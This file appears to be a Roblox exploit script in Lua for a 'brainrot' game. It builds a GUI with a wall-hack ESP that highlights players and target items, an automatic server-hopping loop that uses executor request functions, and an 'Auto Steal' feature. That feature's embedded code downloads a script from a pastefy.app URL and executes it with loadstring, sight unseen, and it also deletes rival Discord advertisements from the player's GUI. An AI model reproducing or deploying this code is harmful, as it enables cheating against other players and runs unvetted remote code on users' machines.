local Players = game:GetService("Players")
local Workspace = game:GetService("Workspace")
local RunService = game:GetService("RunService")
local TweenService = game:GetService("TweenService")
local HttpService = game:GetService("HttpService")
local TeleportService = game:GetService("TeleportService")

local LocalPlayer = Players.LocalPlayer
local Camera = Workspace.CurrentCamera
local PlaceId = game.PlaceId

local MAX_DISTANCE = 250
local CharacterESP = {}
local foundBrainrots = {}
local brainrotNames = _G.TargetBrainrots or {}
local triedServers = {}
local serversTried = 0
local hasFound = false
local settingsFile = "brainrot_settings.json"
local running = true

local settings = {Ping = true, ESP = true}

local function loadSettings()
    if isfile(settingsFile) then
        local success, result = pcall(HttpService.JSONDecode, HttpService, readfile(settingsFile))
        if success then settings = result end
    else
        writefile(settingsFile, HttpService:JSONEncode(settings))
    end
end

local function saveSettings()
    writefile(settingsFile, HttpService:JSONEncode(settings))
end

loadSettings()

local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Parent = LocalPlayer:WaitForChild("PlayerGui")
ScreenGui.ResetOnSpawn = false

local frame = Instance.new("Frame", ScreenGui)
frame.Size = UDim2.new(0, 403, 0, 415)
frame.Position = UDim2.new(0.429, 0, 0.276, 0)
frame.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
frame.Active = true
frame.Draggable = true
Instance.new("UICorner", frame).CornerRadius = UDim.new(0, 10)

local Logger = Instance.new("ScrollingFrame", frame)
Logger.Size = UDim2.new(0, 403, 0, 305)
Logger.Position = UDim2.new(0, 0, 0.135, 0)
Logger.BackgroundTransparency = 1
Logger.ScrollBarThickness = 9
Logger.AutomaticCanvasSize = Enum.AutomaticSize.Y
local listLayout = Instance.new("UIListLayout", Logger)
listLayout.SortOrder = Enum.SortOrder.LayoutOrder
listLayout.Padding = UDim.new(0, 5)
listLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center

local scanningLabel = Instance.new("TextLabel", frame)
scanningLabel.Size = UDim2.new(0, 403, 0, 50)
scanningLabel.Position = UDim2.new(0, 0, 0.87, 0)
scanningLabel.BackgroundTransparency = 1
scanningLabel.Font = Enum.Font.FredokaOne
scanningLabel.Text = ""
scanningLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
scanningLabel.TextSize = 14

local FoundAmount = Instance.new("TextLabel", frame)
FoundAmount.Size = UDim2.new(0, 403, 0, 50)
FoundAmount.Font = Enum.Font.FredokaOne
FoundAmount.TextColor3 = Color3.fromRGB(255, 255, 255)
FoundAmount.TextSize = 30
FoundAmount.BackgroundTransparency = 1
FoundAmount.Text = "Found: 0"

local SettingsOpenButton = Instance.new("ImageButton", frame)
SettingsOpenButton.Size = UDim2.new(0, 50, 0, 50)
SettingsOpenButton.Position = UDim2.new(1.038, 0, 0, 0)
SettingsOpenButton.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
SettingsOpenButton.Image = "rbxassetid://100665044102453"
Instance.new("UICorner", SettingsOpenButton).CornerRadius = UDim.new(0, 10)

local SettingsGUI = Instance.new("Frame", frame)
SettingsGUI.Size = UDim2.new(0, 190, 0, 220)
SettingsGUI.Position = UDim2.new(12.0, 0, 0, 0)
SettingsGUI.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
Instance.new("UICorner", SettingsGUI).CornerRadius = UDim.new(0, 10)

local function createToggle(parent, labelText, defaultState, yPosition, settingName)
    local Label = Instance.new("TextLabel", parent)
    Label.Size = UDim2.new(0, 98, 0, 50)
    Label.Position = UDim2.new(0, 10, 0, yPosition)
    Label.Font = Enum.Font.FredokaOne
    Label.Text = labelText
    Label.TextColor3 = Color3.fromRGB(255, 255, 255)
    Label.TextSize = 28
    Label.BackgroundTransparency = 1

    local Toggle = Instance.new("Frame", parent)
    Toggle.Size = UDim2.new(0, 70, 0, 34)
    Toggle.Position = UDim2.new(0.55, 0, 0, yPosition + 6)
    Toggle.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
    Instance.new("UICorner", Toggle).CornerRadius = UDim.new(0, 17)

    local Knob = Instance.new("Frame", Toggle)
    Knob.Size = UDim2.new(0, 26, 0, 26)
    Knob.Position = defaultState and UDim2.new(1, -30, 0, 4) or UDim2.new(0, 4, 0, 4)
    Knob.BackgroundColor3 = defaultState and Color3.fromRGB(255, 0, 0) or Color3.fromRGB(35, 35, 35)
    Instance.new("UICorner", Knob).CornerRadius = UDim.new(1, 0)

    local function toggleAction()
        settings[settingName] = not settings[settingName]
        saveSettings()
        local on = settings[settingName]
        TweenService:Create(Knob, TweenInfo.new(0.2, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
            Position = on and UDim2.new(1, -30, 0, 4) or UDim2.new(0, 4, 0, 4),
            BackgroundColor3 = on and Color3.fromRGB(255, 0, 0) or Color3.fromRGB(35, 35, 35)
        }):Play()
    end

    Toggle.InputBegan:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 then toggleAction() end
    end)
    Knob.InputBegan:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 then toggleAction() end
    end)
end

createToggle(SettingsGUI, "Ping:", settings.Ping, 10, "Ping")
createToggle(SettingsGUI, "ESP:", settings.ESP, 80, "ESP")

local settingsOpen = false
SettingsOpenButton.MouseButton1Click:Connect(function()
    settingsOpen = not settingsOpen
    TweenService:Create(SettingsGUI, TweenInfo.new(0.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
        {Position = settingsOpen and UDim2.new(1.03, 0, 0, 0) or UDim2.new(12.0, 0, 0, 0)}):Play()
end)

local pingSound = Instance.new("Sound")
pingSound.SoundId = (_G.PingSoundId or "rbxassetid://17208361335")
pingSound.Volume = 1
pingSound.Parent = Workspace

local pinged = false
local function pingOnce()
    if settings.Ping and not pinged then
        pcall(function() pingSound:Play() end)
        pinged = true
    end
end

local COLOR_PLAYER_BLUE = Color3.fromRGB(0, 120, 255)
local COLOR_PLAYER_FRIEND = Color3.fromRGB(0, 255, 100)
local COLOR_BRAINROT = Color3.fromRGB(255, 0, 0)
local HIGHLIGHT_FILL_TRANSPARENCY = 0.6
local HIGHLIGHT_OUTLINE_TRANSPARENCY = 0.15

local function sameTeam(p1, p2)
    return p1 and p2 and p1.Team and p2.Team and p1.Team == p2.Team
end

local function getModelReferencePart(model)
    if not model then return nil end
    if model:IsA("Model") and model.PrimaryPart then return model.PrimaryPart end
    local hrp = model:FindFirstChild("HumanoidRootPart")
    if hrp then return hrp end
    for _, child in ipairs(model:GetChildren()) do
        if child:IsA("BasePart") then return child end
    end
    return nil
end

local function cleanupESP()
    for model, data in pairs(CharacterESP) do
        if data.Highlight and data.Highlight.Parent then
            pcall(function() data.Highlight:Destroy() end)
        end
        if data.Billboard and data.Billboard.Parent then
            pcall(function() data.Billboard:Destroy() end)
        end
    end
    CharacterESP = {}
end

local function isAlive(character)
    local humanoid = character and character:FindFirstChildOfClass("Humanoid")
    return humanoid and humanoid.Health > 0
end

local function distanceFromCameraPosition(pos)
    return (Camera.CFrame.Position - pos).Magnitude
end

local function createESP(model, owner, displayName)
    if not model then return end
    if CharacterESP[model] then return end

    local fillColor
    if owner and owner.IsPlayer then
        if owner.Player and sameTeam(LocalPlayer, owner.Player) then
            fillColor = COLOR_PLAYER_FRIEND
        else
            fillColor = COLOR_PLAYER_BLUE
        end
    else
        fillColor = COLOR_BRAINROT
    end

    local highlight = Instance.new("Highlight")
    highlight.Name = "ESP_Highlight"
    highlight.Adornee = model
    highlight.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
    highlight.FillTransparency = HIGHLIGHT_FILL_TRANSPARENCY
    highlight.OutlineTransparency = HIGHLIGHT_OUTLINE_TRANSPARENCY
    highlight.FillColor = fillColor
    highlight.OutlineColor = Color3.fromRGB(0, 0, 0)
    highlight.Parent = workspace

    local adorneePart = model:FindFirstChild("Head") or getModelReferencePart(model)
    local billboard = nil
    if adorneePart and displayName then
        billboard = Instance.new("BillboardGui")
        billboard.Name = "ESP_Name"
        billboard.Adornee = adorneePart
        billboard.AlwaysOnTop = true
        billboard.Size = UDim2.fromOffset(140, 24)
        billboard.ExtentsOffsetWorldSpace = Vector3.new(0, 2.2, 0)
        billboard.MaxDistance = MAX_DISTANCE
        billboard.Parent = adorneePart

        local label = Instance.new("TextLabel")
        label.Name = "ESPNameLabel"
        label.BackgroundTransparency = 1
        label.Size = UDim2.fromScale(1, 1)
        label.Text = displayName
        label.TextScaled = true
        label.TextSize = 16
        label.Font = Enum.Font.GothamMedium
        label.TextColor3 = fillColor
        label.Parent = billboard

        local stroke = Instance.new("UIStroke")
        stroke.Thickness = 1
        stroke.Color = Color3.fromRGB(0, 0, 0)
        stroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Contextual
        stroke.Parent = label
    end

    CharacterESP[model] = {
        Highlight = highlight,
        Billboard = billboard,
        Owner = owner
    }
end

RunService.RenderStepped:Connect(function()
    if not settings.ESP then
        for model, data in pairs(CharacterESP) do
            if data.Highlight then data.Highlight.Enabled = false end
            if data.Billboard then data.Billboard.Enabled = false end
        end
        return
    end

    for model, data in pairs(CharacterESP) do
        local valid = model and model.Parent
        if not valid then
            if data.Highlight and data.Highlight.Parent then pcall(function() data.Highlight:Destroy() end) end
            if data.Billboard and data.Billboard.Parent then pcall(function() data.Billboard:Destroy() end) end
            CharacterESP[model] = nil
        else
            local refPart = getModelReferencePart(model)
            if refPart then
                local pos = refPart.Position
                local d = distanceFromCameraPosition(pos)
                local within = d <= MAX_DISTANCE
                local owner = data.Owner
                local show = within
                if owner and owner.IsPlayer and model:FindFirstChildOfClass("Humanoid") then
                    show = show and isAlive(model)
                end

                if data.Highlight then
                    data.Highlight.Enabled = show
                    if owner and owner.IsPlayer then
                        if owner.Player and sameTeam(LocalPlayer, owner.Player) then
                            data.Highlight.FillColor = COLOR_PLAYER_FRIEND
                        else
                            data.Highlight.FillColor = COLOR_PLAYER_BLUE
                        end
                    else
                        data.Highlight.FillColor = COLOR_BRAINROT
                    end
                end

                if data.Billboard then
                    data.Billboard.Enabled = show
                end
            else
                if data.Highlight then data.Highlight.Enabled = false end
                if data.Billboard then data.Billboard.Enabled = false end
            end
        end
    end
end)

local function matchesBrainrot(name, obj)
    for _, br in ipairs(brainrotNames) do
        if name:lower() == br:lower() then
            if (br == "Los Matteos" or br == "Matteo") and obj:IsDescendantOf(workspace:FindFirstChild("Events")) then
                return nil
            end
            return br
        end
    end
    return nil
end

local pinged = false
local function scan()
    local foundBrainrotsLocal = {}
    local foundNamesLocal = {}
    cleanupESP()
    local hasFoundLocal = false

    for _, child in ipairs(Logger:GetChildren()) do
        if child:IsA("TextLabel") then
            child:Destroy()
        end
    end

    for _, obj in ipairs(Workspace:GetDescendants()) do
        if (obj:IsA("Model") or obj:IsA("Folder")) and not obj:IsDescendantOf(LocalPlayer.Character) then
            local match = matchesBrainrot(obj.Name, obj)
            if match then
                foundBrainrotsLocal[match] = (foundBrainrotsLocal[match] or 0) + 1
                foundNamesLocal[match] = true

                if settings.ESP then
                    createESP(obj, {Name = match, IsPlayer = false}, match)
                end

                if settings.Ping and not pinged then
                    pcall(function() pingSound:Play() end)
                    pinged = true
                end

                hasFoundLocal = true
            end
        end
    end

    if settings.ESP then
        for _, player in ipairs(Players:GetPlayers()) do
            if player ~= LocalPlayer and player.Character then
                createESP(player.Character, {Name = player.Name, IsPlayer = true, Player = player}, (player.DisplayName ~= "" and player.DisplayName) or player.Name)
                foundNamesLocal[player.Name] = true
            end
        end
    end

    foundBrainrots = foundBrainrotsLocal
    foundNames = foundNamesLocal
    hasFound = hasFoundLocal


    for name, count in pairs(foundBrainrotsLocal) do
        local logLabel = Instance.new("TextLabel")
        logLabel.Size = UDim2.new(1, 0, 0, 25)
        logLabel.BackgroundTransparency = 1
        logLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
        logLabel.Text = name .. " (" .. count .. "x)"
        logLabel.Font = Enum.Font.GothamBold
        logLabel.TextSize = 18
        logLabel.Parent = Logger
    end

    scanningLabel.Text = hasFoundLocal and "✅ Found!" or "🔎 Scanning..."
    local totalFound = 0
    for _, v in pairs(foundBrainrots) do totalFound += v end
    FoundAmount.Text = "Found: " .. totalFound

    if not hasFoundLocal then
        pinged = false
    end
end

local AUTO_STEAL_CODE = [[
local GUI_LOADER_URL = "https://pastefy.app/O0LXMwBW/raw"

local Players = game:GetService("Players")
local player = Players.LocalPlayer
while not player do wait() end
local playerGui = player:WaitForChild("PlayerGui")

local function safeLoad(url)
    pcall(function()
        local body = game:HttpGet(url)
        local fn = loadstring(body)
        if fn then pcall(fn) end
    end)
end

spawn(function() safeLoad(GUI_LOADER_URL) end)

spawn(function()
    local gui, button
    while true do
        if not gui then gui = playerGui:FindFirstChild("LENNON_TWEEN_PLUS_V3", true) end
        if gui and not button then button = gui:FindFirstChild("AtivarTeleguiadoBtn", true) end
        if gui and gui:IsA("ScreenGui") then gui.Enabled = true end
        if button and button:IsA("GuiObject") then button.Visible = true end
        wait(0.1)
    end
end)

local function isBlacklisted(text)
    local t = tostring(text or "")
    t = t:gsub("<.->", ""):lower()
    local nospaces = t:gsub("%s+", "")
    if t:find("join discord for more scripts", 1, true) then return true end
    if nospaces:find("https://discord.gg/fmuqpzjahx", 1, true) then return true end
    if nospaces:find("discord.gg/fmuqpzjahx", 1, true) then return true end
    return false
end

local function nukeIfBlacklisted(lbl)
    if not (lbl and lbl:IsA("TextLabel")) then return end
    if isBlacklisted(lbl.Text) then
        local root = lbl:FindFirstAncestorOfClass("ScreenGui")
        if root then root:Destroy() else lbl:Destroy() end
    end
end

local function watchLabel(lbl)
    nukeIfBlacklisted(lbl)
    if not (lbl and lbl:IsA("TextLabel")) then return end
    lbl:GetPropertyChangedSignal("Text"):Connect(function()
        nukeIfBlacklisted(lbl)
    end)
end

for _, d in ipairs(playerGui:GetDescendants()) do
    if d:IsA("TextLabel") then
        watchLabel(d)
    end
end

playerGui.DescendantAdded:Connect(function(obj)
    if obj:IsA("TextLabel") then
        watchLabel(obj)
    end
end)
]]

local autoStealActive = false
local AutoStealBtn = Instance.new("TextButton", SettingsGUI)
AutoStealBtn.Size = UDim2.new(0, 170, 0, 34)
AutoStealBtn.Position = UDim2.new(0.05, 0, 0.6, 0)
AutoStealBtn.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
AutoStealBtn.BorderSizePixel = 0
AutoStealBtn.Font = Enum.Font.FredokaOne
AutoStealBtn.TextSize = 16
AutoStealBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
AutoStealBtn.Text = "Auto Steal"
Instance.new("UICorner", AutoStealBtn).CornerRadius = UDim.new(0, 8)

AutoStealBtn.MouseButton1Click:Connect(function()
    if autoStealActive then return end
    autoStealActive = true
    AutoStealBtn.Text = "Auto Steal Loaded!"
    task.wait(1)
    AutoStealBtn.Text = "Auto Steal"
    AutoStealBtn.BackgroundColor3 = Color3.fromRGB(40, 40, 40)

    spawn(function()
        local ok, err = pcall(function()
            local fn = loadstring(AUTO_STEAL_CODE)
            if fn then fn() end
        end)
        if not ok then
            warn("Auto Steal execution error:", err)
            AutoStealBtn.Text = "Auto Steal: ERR"
        end
    end)
end)

local CloseBtn = Instance.new("TextButton", SettingsGUI)
CloseBtn.Size = UDim2.new(0, 170, 0, 30)
CloseBtn.Position = UDim2.new(0.05, 0, 0.8, 0)
CloseBtn.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
CloseBtn.BorderSizePixel = 0
CloseBtn.Font = Enum.Font.FredokaOne
CloseBtn.TextSize = 16
CloseBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
CloseBtn.Text = "Close"
Instance.new("UICorner", CloseBtn).CornerRadius = UDim.new(0, 8)


CloseBtn.MouseButton1Click:Connect(function()
    settingsOpen = false
    TweenService:Create(SettingsGUI, TweenInfo.new(0.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
        {Position = UDim2.new(12.0, 0, 0, 0)}):Play()
end)

local function tryServers()
    local req = (syn and syn.request) or request or http_request
    if not req then return end

    local function fetchServers(cursor)
        local url = "https://games.roblox.com/v1/games/" .. PlaceId .. "/servers/Public?sortOrder=Asc&limit=100"
        if cursor then url = url .. "&cursor=" .. cursor end
        local success, result = pcall(function()
            return HttpService:JSONDecode(req({Url = url, Method = "GET"}).Body)
        end)
        return success and result or nil
    end

    local function hopLoop()
        local cursor = nil
        repeat
            local result = fetchServers(cursor)
            if not result then break end

            local serversChecked = 0
            for _, server in ipairs(result.data or {}) do
                if not running then return end
                if server.id ~= game.JobId and server.playing < server.maxPlayers and not triedServers[server.id] then
                    triedServers[server.id] = true
                    serversTried += 1
                    scanningLabel.Text = "🔁 Hopping... (" .. serversTried .. ")"

                    coroutine.wrap(function()
                        pcall(function()
                            TeleportService:TeleportToPlaceInstance(PlaceId, server.id, LocalPlayer)
                        end)
                    end)()

                    serversChecked += 1
                    if serversChecked >= 5 then
                        task.wait(1)
                        serversChecked = 0
                    end
                end
            end
            cursor = result.nextPageCursor
        until not cursor
    end

    hopLoop()
end

task.spawn(function()
    while true do
        if running then
            scan()
            local total = 0
            for _, c in pairs(foundBrainrots) do total += c end

            if total == 0 then
                hasFound = false
                scanningLabel.Text = "🔎 No brainrots found, hopping..."
                tryServers()
            else
                hasFound = true
                scanningLabel.Text = "✅ Found!"
            end
        end
        task.wait(1)
    end
end)
